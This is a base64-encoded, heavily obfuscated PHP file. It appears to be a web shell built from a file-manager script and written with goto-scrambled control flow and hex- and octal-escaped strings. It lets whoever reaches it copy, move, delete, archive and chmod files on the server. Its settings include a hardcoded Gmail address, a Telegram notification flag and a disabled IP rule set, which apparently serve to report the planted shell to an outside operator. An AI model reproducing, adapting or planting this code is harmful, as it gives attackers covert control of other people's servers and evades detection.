ZSB7ICRjb250ZW50ID0gIlx4M2NceDcwXHg3MlwxNDVceDNlIiAuIGZtX2VuYygkY29udGVudCkgLiAiXDc0XDU3XHg3MFx4NzJceDY1XDc2IjsgfSBlY2hvICRjb250ZW50OyB9ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDw/cGhwICBpZiAoISRxdWlja1ZpZXcpIHsgZm1fc2hvd19mb290ZXIoKTsgfSBkaWU7IH0gZ290byBKRk5MazsgSTAyanE6IGlmIChpc3NldCgkX0dFVFsiXDE0M1wxNTdceDcwXHg3OSJdKSAmJiAhaXNzZXQoJF9HRVRbIlx4NjZceDY5XDE1Nlx4NjlcMTYzXDE1MCJdKSAmJiAhRk1fUkVBRE9OTFkpIHsgJGNvcHkgPSAkX0dFVFsiXHg2M1x4NmZceDcwXHg3OSJdOyAkY29weSA9IGZtX2NsZWFuX3BhdGgoJGNvcHkpOyBpZiAoJGNvcHkgPT0gJycgfHwgIWZpbGVfZXhpc3RzKEZNX1JPT1RfUEFUSCAuICJcNTciIC4gJGNvcHkpKSB7IGZtX3NldF9tc2cobG5nKCJceDQ2XDE1MVx4NmNceDY1XHgyMFx4NmVcMTU3XHg3NFx4MjBcMTQ2XHg2Zlx4NzVcMTU2XDE0NCIpLCAiXHg2NVx4NzJceDcyXHg2ZlwxNjIiKTsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXHgzZlx4NzBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZm1fc2hvd19oZWFkZXIoKTsgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgPz4KICAgIDxkaXYgY2xhc3M9InBhdGgiPgogICAgICAgIDxwPjxiPkNvcHlpbmc8L2I+PC9wPgogICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj4KICAgICAgICAgICAgU291cmNlIHBhdGg6IDw/cGhwICBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbihGTV9ST09UX1BBVEggLiAiXHgyZiIgLiAkY29weSkpOyA/Pgo8YnI+CiAgICAgICAgICAgIERlc3RpbmF0aW9uIGZvbGRlcjogPD9waHAgIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKEZNX1JPT1RfUEFUSCAuICJceDJmIiAuIEZNX1BBVEgpKTsgPz4KICAgICAgICA8L3A+CiAgICAgICAgPHA+CiAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZShGTV9QQVRIKTsgPz4KJmFtcDtjb3B5PTw/cGhwICBlY2hvIHVybGVuY29kZSgkY29weSk7ID8+CiZhbXA7ZmluaXNoPTEiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gQ29weTwvYT48L2I+ICZuYnNwOwogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7Y29weT08P3BocCAgZWNobyB1cmxlbmNvZGUoJGNvcHkpOyA/PgomYW1wO2ZpbmlzaD0xJmFtcDttb3ZlPTEiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gTW92ZTwvYT48L2I+ICZuYnNwOwogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiBDYW5jZWw8L2E+PC9iPgogICAgICAgIDwvcD4KICAgICAgICA8cD48aT48P3BocCAgZWNobyBsbmcoIlwxMjNceDY1XDE1NFx4NjVceDYzXDE2NFx4MjBceDY2XHg2ZlwxNTRcMTQ0XDE0NVx4NzIiKTsgPz4KPC9pPjwvcD4KICAgICAgICA8dWwgY2xhc3M9ImZvbGRlcnMgYnJlYWstd29yZCI+CiAgICAgICAgICAgIDw/cGhwICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsgPz4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoJHBhcmVudCk7ID8+CiZhbXA7Y29weT08P3BocCAgZWNobyB1cmxlbmNvZGUoJGNvcHkpOyA/PgoiPjxpIGNsYXNzPSJmYSBmYS1jaGV2cm9uLWNpcmNsZS1sZWZ0Ij48L2k+IC4uPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8P3BocCAgfSBmb3JlYWNoICgkZm9sZGVycyBhcyAkZikgeyA/PgogICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAiXHgyZiIgLiAkZiwgIlw1NyIpKTsgPz4KJmFtcDtjb3B5PTw/cGhwICBlY2hvIHVybGVuY29kZSgkY29weSk7ID8+CiI+PGkgY2xhc3M9ImZhIGZhLWZvbGRlci1vIj48L2k+IDw/cGhwICBlY2hvIGZtX2NvbnZlcnRfd2luKCRmKTsgPz4KPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgIDwvdWw+CiAgICA8L2Rpdj4KICAgIDw/cGhwICBmbV9zaG93X2Zvb3RlcigpOyBkaWU7IH0gZ290byBvMndoUTsgbU5TM2I6IGlmIChpc3NldCgkX1BPU1RbIlx4NjdcMTYyXDE1N1x4NzVcMTYwIl0pICYmIChpc3NldCgkX1BPU1RbIlx4N2FceDY5XHg3MCJdKSB8fCBpc3NldCgkX1BPU1RbIlx4NzRcMTQxXHg3MiJdKSkgJiYgIUZNX1JFQURPTkxZKSB7ICRwYXRoID0gRk1fUk9PVF9QQVRIOyAkZXh0ID0gIlx4N2FceDY5XDE2MCI7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJceDJmIiAuIEZNX1BBVEg7IH0gJGV4dCA9IGlzc2V0KCRfUE9TVFsiXHg3NFx4NjFcMTYyIl0pID8gIlx4NzRceDYxXDE2MiIgOiAiXHg3YVx4NjlceDcwIjsgaWYgKCRleHQgPT0gIlwxNzJcMTUxXDE2MCIgJiYgIWNsYXNzX2V4aXN0cygiXHg1YVx4NjlcMTYwXDEwMVx4NzJceDYzXDE1MFx4NjlcMTY2XDE0NSIpIHx8ICRleHQgPT0gIlwxNjRceDYxXDE2MiIgJiYgIWNsYXNzX2V4aXN0cygiXHg1MFwxNTBcMTQxXDE2MlwxMDRceDYxXDE2NFwxNDEiKSkgeyBmbV9zZXRfbXNnKGxuZygiXDExN1x4NzBceDY1XDE2MlwxNDFceDc0XDE1MVx4NmZceDZlXHg3M1x4MjBceDc3XHg2OVx4NzRceDY4XHgyMFx4NjFcMTYyXDE0M1wxNTBcMTUxXHg3NlwxNDVcMTYzXHgyMFwxNDFceDcyXHg2NVw0MFx4NmVceDZmXHg3NFx4MjBceDYxXHg3Nlx4NjFcMTUxXHg2Y1wxNDFcMTQyXHg2Y1x4NjUiKSwgIlx4NjVceDcyXHg3MlwxNTdceDcyIik7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlx4M2ZcMTYwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9ICRmaWxlcyA9ICRfUE9TVFsiXDE0NlwxNTFcMTU0XDE0NSJdOyBpZiAoIWVtcHR5KCRmaWxlcykpIHsgY2hkaXIoJHBhdGgpOyBpZiAoY291bnQoJGZpbGVzKSA9PSAxKSB7ICRvbmVfZmlsZSA9IHJlc2V0KCRmaWxlcyk7ICRvbmVfZmlsZSA9IGJhc2VuYW1lKCRvbmVfZmlsZSk7ICR6aXBuYW1lID0gJG9uZV9maWxlIC4gIlx4NWYiIC4gZGF0ZSgiXDE3MVx4NmRcMTQ0XDEzN1wxMTBceDY5XHg3MyIpIC4gIlw1NiIgLiAkZXh0OyB9IGVsc2UgeyAkemlwbmFtZSA9ICJceDYxXHg3MlwxNDNceDY4XHg2OVx4NzZceDY1XHg1ZiIgLiBkYXRlKCJcMTcxXHg2ZFx4NjRceDVmXDExMFx4NjlceDczIikgLiAiXDU2IiAuICRleHQ7IH0gaWYgKCRleHQgPT0gIlx4N2FceDY5XHg3MCIpIHsgJHppcHBlciA9IG5ldyBGTV9aaXBwZXIoKTsgJHJlcyA9ICR6aXBwZXItPmNyZWF0ZSgkemlwbmFtZSwgJGZpbGVzKTsgfSBlbHNlaWYgKCRleHQgPT0gIlwxNjRceDYxXHg3MiIpIHsgJHRhciA9IG5ldyBGTV9aaXBwZXJfVGFyKCk7ICRyZXMgPSAkdGFyLT5jcmVhdGUoJHppcG5hbWUsICRmaWxlcyk7IH0gaWYgKCRyZXMpIHsgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygiXDEwMVx4NzJceDYzXDE1MFwxNTFceDc2XDE0NSIpIC4gIlx4MjBcNzRceDYyXDc2XDQ1XDE2M1w3NFw1N1x4NjJcNzZceDIwIiAuIGxuZygiXHg0M1wxNjJcMTQ1XDE0MVx4NzRceDY1XDE0NCIpLCBmbV9lbmMoJHppcG5hbWUpKSk7IH0gZWxzZSB7IGZtX3NldF9tc2cobG5nKCJcMTAxXDE2MlwxNDNceDY4XHg2OVx4NzZcMTQ1XHgyMFwxNTZcMTU3XDE2NFw0MFx4NjNcMTYyXHg2NVx4NjFcMTY0XHg2NVwxNDQiKSwgIlwxNDVceDcyXDE2Mlx4NmZceDcyIik7IH0gfSBlbHNlIHsgZm1fc2V0X21zZyhsbmcoIlx4NGVceDZmXDE2NFx4NjhceDY5XHg2ZVwxNDdceDIwXHg3M1wxNDVceDZjXHg2NVx4NjNceDc0XDE0NVx4NjQiKSwgIlx4NjFceDZjXHg2NVwxNjJcMTY0Iik7IH0gZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXHgzZlwxNjBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZ290byBFWWN2OTsgSG44Slc6IGZ1bmN0aW9uIGZtX2dldF9wYXJlbnRfcGF0aCgkcGF0aCkgeyAkcGF0aCA9IGZtX2NsZWFuX3BhdGgoJHBhdGgpOyBpZiAoJHBhdGggIT0gJycpIHsgJGFycmF5ID0gZXhwbG9kZSgiXHgyZiIsICRwYXRoKTsgaWYgKGNvdW50KCRhcnJheSkgPiAxKSB7ICRhcnJheSA9IGFycmF5X3NsaWNlKCRhcnJheSwgMCwgLTEpOyByZXR1cm4gaW1wbG9kZSgiXDU3IiwgJGFycmF5KTsgfSByZXR1cm4gJyc7IH0gcmV0dXJuIGZhbHNlOyB9IGdvdG8gVVVXQWU7IHlYdXIyOiBlY2hvICR0YWJsZVRoZW1lOyBnb3RvIEI5aGY5OyBFaFFfcjogaWYgKGlzc2V0KCRfR0VUWyJceDZjXHg2ZlwxNDdcMTU3XDE2NVwxNjQiXSkpIHsgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJcMTU0XHg2ZlwxNDdceDY3XDE0NVwxNDQiXSk7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMKTsgfSBnb3RvIHJLVEdrOyBQMzJFbTogPz4KPC90aD4KICAgICAgICAgICAgICAgIDx0aD48P3BocCAgZ290byBBakNYNDsgdVVlclY6IGZ1bmN0aW9uIGZtX21rZGlyKCRkaXIsICRmb3JjZSkgeyBpZiAoZmlsZV9leGlzdHMoJGRpcikpIHsgaWYgKGlzX2RpcigkZGlyKSkgeyByZXR1cm4gJGRpcjsgfSBlbHNlaWYgKCEkZm9yY2UpIHsgcmV0dXJuIGZhbHNlOyB9IHVubGluaygkZGlyKTsgfSByZXR1cm4gbWtkaXIoJGRpciwgNTExLCB0cnVlKTsgfSBnb3RvIGROREtyOyBUbnI0dDogaWYgKGlzc2V0KCRfUE9TVFsiXHg2N1x4NzJceDZmXDE2NVwxNjAiXSwgJF9QT1NUWyJceDY0XHg2NVwxNTRceDY1XDE2NFx4NjUiXSkgJiYgIUZNX1JFQURPTkxZKSB7ICRwYXRoID0gRk1fUk9PVF9QQVRIOyBpZiAoRk1fUEFUSCAhPSAnJykgeyAkcGF0aCAuPSAiXHgyZiIgLiBGTV9QQVRIOyB9ICRlcnJvcnMgPSAwOyAkZmlsZXMgPSAkX1BPU1RbIlx4NjZceDY5XDE1NFwxNDUiXTsgaWYgKGlzX2FycmF5KCRmaWxlcykgJiYgY291bnQoJGZpbGVzKSkgeyBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsgaWYgKCRmICE9ICcnKSB7ICRuZXdfcGF0aCA9ICRwYXRoIC4gIlx4MmYiIC4gJGY7IGlmICghZm1fcmRlbGV0ZSgkbmV3X3BhdGgpKSB7ICRlcnJvcnMrKzsgfSB9IH0gaWYgKCRlcnJvcnMgPT0gMCkgeyBmbV9zZXRfbXNnKGxuZygiXDEyM1wxNDVceDZjXDE0NVx4NjNcMTY0XHg2NVwxNDRcNDBceDY2XHg2OVx4NmNceDY1XDE2M1x4MjBceDYxXHg2ZVx4NjRcNDBceDY2XDE1N1wxNTRceDY0XHg2NVwxNjJcNDBcMTQ0XDE0NVx4NmNcMTQ1XHg3NFx4NjVceDY0IikpOyB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXHg0NVwxNjJcMTYyXDE1N1x4NzJcNDBceDc3XDE1MFx4NjlceDZjXHg2NVx4MjBceDY0XDE0NVx4NmNceDY1XHg3NFx4NjlceDZlXDE0N1x4MjBcMTUxXDE2NFwxNDVceDZkXDE2MyIpLCAiXHg2NVwxNjJcMTYyXHg2Zlx4NzIiKTsgfSB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXDExNlx4NmZcMTY0XHg2OFx4NjlcMTU2XHg2N1w0MFwxNjNcMTQ1XHg2Y1x4NjVceDYzXHg3NFwxNDVceDY0IiksICJceDYxXDE1NFx4NjVceDcyXHg3NCIpOyB9IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlw3N1x4NzBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZ290byBtTlMzYjsgdjYzTVg6IEBpbmlfc2V0KCJceDY0XHg2OVwxNjNceDcwXHg2Y1wxNDFcMTcxXDEzN1x4NjVcMTYyXHg3Mlx4NmZcMTYyXDE2MyIsIDApOyBnb3RvIHN4S3M0OyBIX0ZyRTogJHRlbGVncmFtID0gIlx4NmZceDZlIjsgZ290byBvd0ZVNDsgVVNDQ0E6ICRpcF9ydWxlc2V0ID0gIlwxMTdcMTA2XDEwNiI7IGdvdG8gc25IVVI7IGhpM2o3OiBmdW5jdGlvbiBmbV9jbGVhbl9wYXRoKCRwYXRoLCAkdHJpbSA9IHRydWUpIHsgJHBhdGggPSAkdHJpbSA/IHRyaW0oJHBhdGgpIDogJHBhdGg7ICRwYXRoID0gdHJpbSgkcGF0aCwgIlwxMzRcNTciKTsgJHBhdGggPSBzdHJfcmVwbGFjZShhcnJheSgiXHgyZVw1Nlx4MmYiLCAiXHgyZVx4MmVceDVjIiksICcnLCAkcGF0aCk7ICRwYXRoID0gZ2V0X2Fic29sdXRlX3BhdGgoJHBhdGgpOyBpZiAoJHBhdGggPT0gIlx4MmVceDJlIikgeyAkcGF0aCA9ICcnOyB9IHJldHVybiBzdHJfcmVwbGFjZSgiXHg1YyIsICJceDJmIiwgJHBhdGgpOyB9IGdvdG8gSG44Slc7IG9NY0hKOiAkZGlyZWN0b3JpZXNfdXNlcnMgPSBhcnJheSgpOyBnb3RvIFBlVDgyOyBXMGZIZDogJHRvID0gIlx4NzRcMTU3XHg3NVx4NzRceDcyXDE0N1wxNTdcMTQ0XDE1MVwxNTZceDY3XDEwMFx4NjdceDZkXHg2MVwxNTFceDZjXDU2XDE0M1x4NmZceDZkIjsgZ290byB6TXEyTDsgZ3BtTjc6ICRjb25maWdfZmlsZSA9IF9fRElSX18gLiAiXDU3XHg2M1wxNTdcMTU2XHg2Nlx4NjlcMTQ3XDU2XHg3MFwxNTBceDcwIjsgZ290byB5VnZ5aDsgZ3pwaTc6IGZ1bmN0aW9uIGZtX2dldF9maWxlX2ljb25fY2xhc3MoJHBhdGgpIHsgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJHBhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOyBzd2l0Y2ggKCRleHQpIHsgY2FzZSAiXHg2OVwxNDNcMTU3IjogY2FzZSAiXDE0N1wxNTFcMTQ2IjogY2FzZSAiXDE1MlwxNjBceDY3IjogY2FzZSAiXDE1MlwxNjBcMTQ1XHg2NyI6IGNhc2UgIlx4NmFcMTYwXHg2MyI6IGNhc2UgIlwxNTJcMTYwXDYyIjogY2FzZSAiXHg2YVx4NzBcMTcwIjogY2FzZSAiXHg3OFwxNDJceDZkIjogY2FzZSAiXDE2N1wxNDJcMTU1XHg3MCI6IGNhc2UgIlwxNjBceDZlXHg2NyI6IGNhc2UgIlx4NjJcMTU1XHg3MCI6IGNhc2UgIlx4NzRceDY5XDE0NiI6IGNhc2UgIlwxNjRcMTUxXDE0Nlx4NjYiOiBjYXNlICJcMTY3XHg2NVx4NjJceDcwIjogY2FzZSAiXHg2MVwxNjZceDY5XDE0NiI6IGNhc2UgIlwxNjNceDc2XDE0NyI6ICRpbWcgPSAiXHg2NlwxNDFcNDBcMTQ2XDE0MVx4MmRcMTYwXHg2OVx4NjNcMTY0XHg3NVwxNjJcMTQ1XDU1XHg2ZiI7IGJyZWFrOyBjYXNlICJceDcwXDE0MVx4NzNcMTYzXHg3N1x4NjQiOiBjYXNlICJceDY2XHg3NFx4NzBceDcxXHg3NVwxNTdcMTY0XDE0MSI6IGNhc2UgIlwxNjNceDcxXHg2YyI6IGNhc2UgIlx4NmFceDczIjogY2FzZSAiXDE1Mlx4NzNcMTU3XDE1NiI6IGNhc2UgIlx4NzNceDY4IjogY2FzZSAiXHg2M1wxNTdcMTU2XHg2Nlx4NjlcMTQ3IjogY2FzZSAiXDE2NFwxNjdcMTUxXHg2NyI6IGNhc2UgIlwxNjRceDcwXHg2YyI6IGNhc2UgIlwxNTVcMTQ0IjogY2FzZSAiXHg2N1x4NjlceDc0XDE1MVwxNDdcMTU2XHg2Zlx4NzJcMTQ1IjogY2FzZSAiXHg2MyI6IGNhc2UgIlwxNDNcMTYwXDE2MCI6IGNhc2UgIlwxNDNcMTYzIjogY2FzZSAiXHg3MFx4NzkiOiBjYXNlICJcMTYyXDE2MyI6IGNhc2UgIlx4NmRcMTQxXHg3MCI6IGNhc2UgIlwxNTRcMTU3XHg2M1wxNTMiOiBjYXNlICJcMTQ0XDE2NFwxNDQiOiAkaW1nID0gIlwxNDZcMTQxXDQwXHg2NlwxNDFcNTVcMTQ2XDE1MVwxNTRceDY1XDU1XDE0M1wxNTdceDY0XHg2NVx4MmRceDZmIjsgYnJlYWs7IGNhc2UgIlx4NzRceDc4XDE2NCI6IGNhc2UgIlwxNTFcMTU2XHg2OSI6IGNhc2UgIlx4NjNcMTU3XHg2ZVwxNDYiOiBjYXNlICJceDZjXDE1N1x4NjciOiBjYXNlICJceDY4XHg3NFwxNDFceDYzXDE0M1wxNDVcMTYzXHg3MyI6ICRpbWcgPSAiXHg2Nlx4NjFceDIwXHg2Nlx4NjFceDJkXHg2NlwxNTFceDZjXHg2NVw1NVwxNjRceDY1XHg3OFx4NzRceDJkXDE1NyI7IGJyZWFrOyBjYXNlICJcMTQzXDE2M1wxNjMiOiBjYXNlICJcMTU0XDE0NVx4NzNcMTYzIjogY2FzZSAiXDE2M1wxNDFcMTYzXDE2MyI6IGNhc2UgIlx4NzNcMTQzXDE2M1x4NzMiOiAkaW1nID0gIlx4NjZceDYxXDQwXDE0NlwxNDFcNTVceDYzXDE2M1x4NzNceDMzIjsgYnJlYWs7IGNhc2UgIlwxNDJceDdhXHgzMiI6IGNhc2UgIlx4N2FcMTUxXDE2MCI6IGNhc2UgIlwxNjJceDYxXDE2MiI6IGNhc2UgIlwxNDdceDdhIjogY2FzZSAiXHg3NFwxNDFcMTYyIjogY2FzZSAiXHgzN1x4N2EiOiBjYXNlICJcMTcwXHg3YSI6ICRpbWcgPSAiXDE0NlwxNDFceDIwXHg2NlwxNDFcNTVcMTQ2XHg2OVx4NmNceDY1XDU1XHg2MVwxNjJceDYzXHg2OFwxNTFcMTY2XHg2NVx4MmRceDZmIjsgYnJlYWs7IGNhc2UgIlwxNjBcMTUwXDE2MCI6IGNhc2UgIlx4NzBcMTUwXDE2MFw2NCI6IGNhc2UgIlx4NzBceDY4XDE2MFx4MzUiOiBjYXNlICJcMTYwXDE1MFx4NzBcMTYzIjogY2FzZSAiXDE2MFwxNTBcMTY0XDE1NVx4NmMiOiAkaW1nID0gIlx4NjZcMTQxXHgyMFwxNDZceDYxXHgyZFx4NjNcMTU3XHg2NFx4NjUiOyBicmVhazsgY2FzZSAiXDE1MFwxNjRceDZkIjogY2FzZSAiXHg2OFwxNjRceDZkXHg2YyI6IGNhc2UgIlx4NzNceDY4XHg3NFx4NmRceDZjIjogY2FzZSAiXHg3OFwxNTBceDc0XHg2ZFx4NmMiOiAkaW1nID0gIlwxNDZcMTQxXDQwXDE0Nlx4NjFceDJkXHg2OFwxNjRceDZkXDE1NFx4MzUiOyBicmVhazsgY2FzZSAiXHg3OFwxNTVcMTU0IjogY2FzZSAiXHg3OFx4NzNcMTU0IjogJGltZyA9ICJcMTQ2XHg2MVx4MjBcMTQ2XDE0MVw1NVwxNDZceDY5XDE1NFwxNDVceDJkXDE0NVwxNzBcMTQzXHg2NVx4NmNceDJkXDE1NyI7IGJyZWFrOyBjYXNlICJcMTY3XDE0MVwxNjYiOiBjYXNlICJcMTU1XDE2MFw2MyI6IGNhc2UgIlx4NmRceDcwXDYyIjogY2FzZSAiXHg2ZFw2NFwxNDEiOiBjYXNlICJceDYxXDE0MVwxNDMiOiBjYXNlICJcMTU3XDE0N1wxNDciOiBjYXNlICJcMTU3XDE0N1x4NjEiOiBjYXNlICJceDc3XDE1NVx4NjEiOiBjYXNlICJcMTU1XHg2YlwxNDEiOiBjYXNlICJceDY2XHg2Y1x4NjFceDYzIjogY2FzZSAiXHg2MVwxNDNcNjMiOiBjYXNlICJcMTY0XHg2NFwxNjMiOiAkaW1nID0gIlx4NjZcMTQxXDQwXDE0Nlx4NjFceDJkXDE1NVwxNjVceDczXHg2OVx4NjMiOyBicmVhazsgY2FzZSAiXHg2ZFx4MzNceDc1IjogY2FzZSAiXHg2ZFw2M1x4NzVceDM4IjogY2FzZSAiXHg3MFx4NmNceDczIjogY2FzZSAiXDE0M1wxNjVceDY1IjogY2FzZSAiXHg3OFx4NzNcMTYwXDE0NiI6ICRpbWcgPSAiXDE0Nlx4NjFcNDBceDY2XHg2MVw1NVx4NjhcMTQ1XDE0MVwxNDRcMTYwXDE1MFwxNTdceDZlXDE0NVx4NzMiOyBicmVhazsgY2FzZSAiXDE0MVx4NzZceDY5IjogY2FzZSAiXDE1NVx4NzBcMTQ3IjogY2FzZSAiXDE1NVwxNjBcMTQ1XHg2NyI6IGNhc2UgIlx4NmRcMTYwXHgzNCI6IGNhc2UgIlwxNTVceDM0XHg3NiI6IGNhc2UgIlx4NjZcMTU0XHg3NiI6IGNhc2UgIlx4NjZcNjRceDc2IjogY2FzZSAiXDE1N1x4NjdcMTU1IjogY2FzZSAiXHg2Zlx4NjdceDc2IjogY2FzZSAiXDE1NVwxNTdceDc2IjogY2FzZSAiXDE1NVwxNTNceDc2IjogY2FzZSAiXHgzM1x4NjdceDcwIjogY2FzZSAiXDE0MVwxNjNceDY2IjogY2FzZSAiXHg3N1x4NmRcMTY2IjogJGltZyA9ICJceDY2XDE0MVw0MFwxNDZceDYxXDU1XDE0Nlx4NjlceDZjXHg2NVx4MmRcMTY2XHg2OVx4NjRcMTQ1XHg2Zlw1NVx4NmYiOyBicmVhazsgY2FzZSAiXHg2NVx4NmRcMTU0IjogY2FzZSAiXDE1NVwxNjNcMTQ3IjogJGltZyA9ICJceDY2XDE0MVx4MjBcMTQ2XHg2MVw1NVx4NjVceDZlXHg3NlwxNDVceDZjXDE1N1x4NzBceDY1XHgyZFx4NmYiOyBicmVhazsgY2FzZSAiXDE3MFwxNTRceDczIjogY2FzZSAiXHg3OFwxNTRceDczXHg3OCI6IGNhc2UgIlx4NmZcMTQ0XHg3MyI6ICRpbWcgPSAiXHg2NlwxNDFcNDBcMTQ2XHg2MVx4MmRcMTQ2XHg2OVwxNTRcMTQ1XDU1XHg2NVwxNzBcMTQzXHg2NVx4NmNceDJkXDE1NyI7IGJyZWFrOyBjYXNlICJcMTQzXDE2M1x4NzYiOiAkaW1nID0gIlx4NjZceDYxXDQwXHg2Nlx4NjFcNTVceDY2XHg2OVx4NmNcMTQ1XDU1XHg3NFwxNDVcMTcwXHg3NFw1NVx4NmYiOyBicmVhazsgY2FzZSAiXHg2MlwxNDFceDZiIjogY2FzZSAiXHg3M1x4NzdcMTYwIjogJGltZyA9ICJceDY2XHg2MVw0MFx4NjZcMTQxXHgyZFx4NjNceDZjXDE1MVwxNjBceDYyXDE1N1x4NjFcMTYyXHg2NCI7IGJyZWFrOyBjYXNlICJcMTQ0XDE1N1wxNDMiOiBjYXNlICJceDY0XHg2Zlx4NjNceDc4IjogY2FzZSAiXHg2ZlwxNDRcMTY0IjogJGltZyA9ICJcMTQ2XHg2MVx4MjBcMTQ2XDE0MVx4MmRceDY2XDE1MVwxNTRceDY1XDU1XHg3N1wxNTdceDcyXHg2NFw1NVx4NmYiOyBicmVhazsgY2FzZSAiXDE2MFwxNjBceDc0IjogY2FzZSAiXDE2MFwxNjBcMTY0XDE3MCI6ICRpbWcgPSAiXHg2NlwxNDFcNDBceDY2XHg2MVw1NVx4NjZceDY5XDE1NFwxNDVcNTVceDcwXDE1N1wxNjdcMTQ1XHg3MlwxNjBcMTU3XDE1MVwxNTZceDc0XDU1XDE1NyI7IGJyZWFrOyBjYXNlICJcMTY0XHg3NFwxNDYiOiBjYXNlICJcMTY0XHg3NFwxNDMiOiBjYXNlICJceDZmXDE2NFx4NjYiOiBjYXNlICJcMTY3XHg2ZlwxNDZcMTQ2IjogY2FzZSAiXDE2N1wxNTdcMTQ2XHg2Nlw2MiI6IGNhc2UgIlwxNDVceDZmXHg3NCI6IGNhc2UgIlx4NjZcMTU3XDE1NiI6ICRpbWcgPSAiXHg2Nlx4NjFceDIwXDE0NlwxNDFcNTVceDY2XHg2Zlx4NmVceDc0IjsgYnJlYWs7IGNhc2UgIlwxNjBceDY0XDE0NiI6ICRpbWcgPSAiXDE0NlwxNDFceDIwXHg2Nlx4NjFceDJkXHg2Nlx4NjlcMTU0XHg2NVw1NVx4NzBceDY0XDE0Nlw1NVx4NmYiOyBicmVhazsgY2FzZSAiXHg3MFwxNjNceDY0IjogY2FzZSAiXHg2MVwxNTEiOiBjYXNlICJcMTQ1XHg3MFwxNjMiOiBjYXNlICJceDY2XHg2Y1wxNDEiOiBjYXNlICJceDczXHg3N1wxNDYiOiAkaW1nID0gIlwxNDZcMTQxXHgyMFx4NjZcMTQxXHgyZFwxNDZceDY5XHg2Y1wxNDVceDJkXHg2OVx4NmRcMTQxXDE0N1x4NjVceDJkXDE1NyI7IGJyZWFrOyBjYXNlICJceDY1XHg3OFx4NjUiOiBjYXNlICJcMTU1XHg3M1wxNTEiOiAkaW1nID0gIlx4NjZcMTQxXHgyMFwxNDZceDYxXHgyZFx4NjZceDY5XHg2Y1wxNDVceDJkXDE1NyI7IGJyZWFrOyBjYXNlICJcMTQyXHg2MVwxNjQiOiAkaW1nID0gIlx4NjZcMTQxXHgyMFwxNDZcMTQxXHgyZFwxNjRcMTQ1XDE2Mlx4NmRceDY5XDE1NlwxNDFcMTU0IjsgYnJlYWs7IGRlZmF1bHQ6ICRpbWcgPSAiXDE0NlwxNDFceDIwXHg2Nlx4NjFcNTVceDY5XDE1Nlx4NjZcMTU3XHgyZFwxNDNcMTUxXHg3Mlx4NjNceDZjXDE0NSI7IH0gcmV0dXJuICRpbWc7IH0gZ290byBOa0IyTzsgRkM1M2o6ID8+CiI+CiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJncm91cCIgdmFsdWU9IjEiPgogICAgPGRpdiBjbGFzcz0idGFibGUtcmVzcG9uc2l2ZSI+CiAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSB0YWJsZS1ib3JkZXJlZCB0YWJsZS1ob3ZlciB0YWJsZS1zbSA8P3BocCAgZ290byB5WHVyMjsgSTNLZzE6IGRlZmluZSgiXHg1NlwxMDVceDUyXDEyM1x4NDlcMTE3XDExNiIsICJceDMyXDU2XHgzNFx4MmVcNjYiKTsgZ290byBvNjkxNDsgTWxiVUI6ICRjZmcgPSBuZXcgRk1fQ29uZmlnKCk7IGdvdG8gbEVYOUk7IFM2OUlYOiBpZiAoIWVtcHR5KCRmaWxlcykpIHsgbmF0Y2FzZXNvcnQoJGZpbGVzKTsgfSBnb3RvIGpCWjF2OyBaSkhoUTogZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgZ290byBRY3dRMjsgWGUzT1E6ICRzdGlja3lfbmF2YmFyID0gdHJ1ZTsgZ290byB1WUY2YTsgeDJHV2g6IGZ1bmN0aW9uIGZtX3JjaG1vZCgkcGF0aCwgJGZpbGVtb2RlLCAkZGlybW9kZSkgeyBpZiAoaXNfZGlyKCRwYXRoKSkgeyBpZiAoIWNobW9kKCRwYXRoLCAkZGlybW9kZSkpIHsgcmV0dXJuIGZhbHNlOyB9ICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7IGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsgZm9yZWFjaCAo